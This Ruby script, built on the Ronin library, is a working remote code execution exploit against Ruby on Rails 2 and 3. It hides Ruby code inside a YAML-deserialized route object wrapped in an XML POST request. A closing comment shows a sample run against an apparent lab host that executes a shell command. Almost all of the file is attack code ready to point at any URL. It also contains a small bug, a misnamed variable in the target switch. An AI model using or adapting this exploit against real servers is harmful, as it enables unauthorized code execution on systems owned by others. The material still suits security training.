require 'ronin/network/http'
require 'ronin/formatting/html'
require 'ronin/ui/output'
require 'yaml'

include Ronin::Network::HTTP
include Ronin::UI::Output::Helpers

def escape_payload(payload,target=:rails3)
  case targets
  when :rails3 then "foo\n#{payload}\n__END__\n"
  when :rails2 then "foo\nend\n#{payload}\n__END__\n"
  else
    raise(ArgumentError,"unsupported target: #{target}")
  end
end

def wrap_payload(payload)
  "(#{payload}; @executed = true) unless @executed"
end

def exploit(url,payload,target=:rails3)
  escaped_payload = escape_payload(wrap_payload(payload),target)
  encoded_payload = escaped_payload.to_yaml.sub('--- ','').chomp

  yaml = %{
--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
? #{encoded_payload}
: !ruby/struct
  defaults:
    :action: create
    :controller: foos
  required_parts: []
  requirements:
    :action: create
    :controller: foos
  segment_keys:
    - :format
  }.strip

  xml = %{
<?xml version="1.0" encoding="UTF-8"?>
<exploit type="yaml">#{yaml.html_escape}</exploit>
  }.strip

  return http_post(
    :url       => url,
    :headers   => {
      :content_type           => 'text/xml',
      :x_http_method_override => 'get'
    },
    :body      => xml
  )
end

if $0 == __FILE__
  unless ARGV.length >= 2
    $stderr.puts "usage: #{$0} URL RUBY [rails3|rails2]"
    exit -1
  end

  url     = ARGV[0]
  payload = ARGV[1]
  target  = ARGV.fetch(2,:rails3).to_sym

  print_info "POSTing #{payload} to #{url} ..."
  response = exploit(url,payload,target)

  case response.code
  when '200' then print_info "Success!"
  when '500' then print_error "Error!"
  else            print_error "Received response code #{response.code}"
  end
end

# ruby rails_to_rce_PTL.rb http://ptl-c255bc2a-ab90d9aa.libcurl.so "value = %x( /usr/local/bin/score 'UUID#' )"